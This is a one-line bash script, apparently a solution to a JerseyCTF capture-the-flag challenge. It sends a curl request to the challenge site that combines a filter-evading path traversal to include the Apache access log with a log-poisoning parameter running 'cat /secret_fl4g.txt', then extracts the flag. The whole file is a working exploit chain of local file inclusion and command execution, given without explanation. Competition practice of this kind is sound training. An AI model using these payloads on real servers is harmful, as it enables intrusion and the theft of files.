#!/bin/bash

curl https://jerseyctf-poisoned-v2.chals.io/?page=....//....//....//....//var/log/apache2/access.log&poison=cat%20/secret_fl4g.txt | grep -oE 'jctf{.*}'
